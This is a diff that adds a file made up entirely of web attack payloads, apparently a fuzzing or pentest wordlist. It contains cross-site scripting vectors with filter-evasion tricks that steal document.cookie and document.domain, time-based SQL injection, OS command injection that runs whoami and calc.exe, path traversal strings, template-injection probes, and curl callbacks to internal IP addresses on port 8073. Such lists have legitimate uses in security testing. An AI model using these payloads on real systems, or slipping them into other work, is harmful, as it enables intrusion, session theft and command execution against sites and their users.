@@ -1,0 +1,41 @@
+%00%20;t";calc.exe
+%00%20;<a href=jav%26%23x61%3bscript:alert(2)>
+%00%20;if(1=1,sleep(10),0)/*'XOR(if(1=1,sleep(10),0))OR'"XOR(if(1=1,sleep(10),0))OR"*/
+%00%20;cmd.exe /c whoami
+%00%20;s'),pg_sleep(4);--
+ '"/</div><div onmouseover="alert('test')">ox</div>
+window[['a'][0] + 'lert'](1337)
+/*\"<sVg/oNloAd=alert(document.domain)//>\x3e
+"<img src=x onerror=confirm(document.domain)>br><"
+%00%20;"><img src=x:alert(alt) onerror=eval(src) alt=0>
+<iframe width="560" height="315" src="javascript:javascript:alert(document.cookie)" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+--'`"><img src=x>kdskf${{7*7}}
+<img/src/onerror=alert('XSS')>
+"-alert(document.domain)-"
+ <a href="javascript%26colon;alert(1111)">click 
+[].sort.call`${alert}1337`
+[].map.call`${eval}\\u{61}lert\x281337\x29`
+�script�alert(�XSS�)�/script�
+😋img src=x onerror=alert(document.domain)//💛
+%00%20;window[[%27a%27][0]%252b%27lert%27](1337)
+%00%20;0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+%00%20;t/../../../../t.txt
+%00%20;/../../../../t1.txt
+%00%20;t\..\..\..\..\t.txt
+%00%20;\..\..\..\..\t1.txt
+%00%20;<img/src/oneror=alert(5)>
+%00%20;test"/><a href="data:text/html,<script>alert(4)</script>">ada</a>
+%00%20;"><Svg Only=1 OnLoad=confirm(document.domain)>
+%00%20;test"/><a href="data:text/html,<img src=x onerror=alert(4)>">ada</a>
+%00%20;http://172.24.158.126:8073
+%00%20;http://172.24.153.93:8073
+%00%20;curl http://172.24.158.126:8073
+%00%20;curl http://172.24.153.93:8073
+%00%20;t;test"+Runtime.getRuntime()+"test
+%00%20;test;calc.exe;
+%00%20;test\r\ncalc.exe
+%00%20;123;whoami
+%0at;`whoami`;
+%00%20;`calc.exe`
